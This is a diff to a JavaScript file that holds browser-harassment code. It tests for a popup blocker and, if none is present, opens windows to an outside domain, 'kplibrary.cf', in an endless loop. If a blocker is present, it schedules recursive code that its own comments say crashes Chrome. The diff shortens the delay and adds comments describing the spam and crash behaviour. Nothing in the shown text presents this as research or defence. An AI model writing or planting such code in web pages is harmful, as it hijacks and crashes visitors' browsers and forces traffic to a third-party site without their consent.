@@ -9,17 +9,19 @@ function recursor() {
 
 function detectPopupBlocker() {
   var myTest = window.open("about:blank", "", "directories=no,height=100,width=100,menubar=no,resizable=no,scrollbars=no,status=no,titlebar=no,top=0,location=no");
-  if (!myTest) {
+  if (!myTest) 
+  { // Tests for pop-up blocker ^
     setTimeout(function() {
       recursor();
-    }, 500000);
-
+    }, 50000);
+//Runs recursory code ^ (crashes chrome)
   } else {
     myTest.close();
     while (true) {
       var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
       var URL = "kplibrary.cf" + location.href;
       var win = window.open(URL, "_blank", strWindowFeatures);
+      //If no pop-up blocker spams a shit ton of pop-ups
     }
   }
 }
